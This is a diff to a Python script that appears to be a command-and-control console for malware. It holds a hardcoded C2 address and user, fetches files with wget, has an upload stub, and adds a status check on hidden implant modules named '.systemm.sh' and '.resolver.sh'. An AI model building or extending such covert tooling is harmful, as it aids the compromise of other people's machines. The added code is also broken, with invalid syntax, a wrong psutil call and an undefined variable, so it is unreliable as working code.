@@ -2,6 +2,7 @@ import os
 import subprocess
 import argparse
 from sys import argv
+import psutil
 CnC = "192.168.102.16"
 CnCUser = "sysadmin"
 inVal = ""
@@ -15,7 +16,6 @@ def main():
     os.system("clear")
     print("Hey you, you're finally awake")
     print("Systemm, it just works")
-    os.system("echo -e "+"\033[32m Test\033[0m")
     while (cont):
         print()
         value = input("Enter command(h or H - Help | e or E - Exit): ")
@@ -106,4 +106,20 @@ def main():
                     os.system("wget -P "+Dir+ " "+link)
         elif(value.lower() in ('l')):
             print("Uploading.....")
+        elif(value.lower() in ('s')):
+            print("Current module status:")
+            if(checkStatus(.systemm.sh)):
+                os.system("echo -e "+"systemm status: "+"\033[32m[ACTIVE]\033[0m")
+            else:
+                os.system("echo -e "+"systemm status: "+"\033[31m[INACTIVE]\033[0m")
+            if(checkStatus(.resolver.sh)):
+                os.system("echo -e "+"resolver status: "+"\033[32m[ACTIVE]\033[0m")
+            else:
+                os.system("echo -e "+"resolver status: "+"\033[31m[INACTIVE]\033[0m")
+                
+def checkStatus(fileName):
+    for process in psutil.process_iter(['fileName']):
+        if process.info['name'] == name:
+            return True
+    return False
 main()
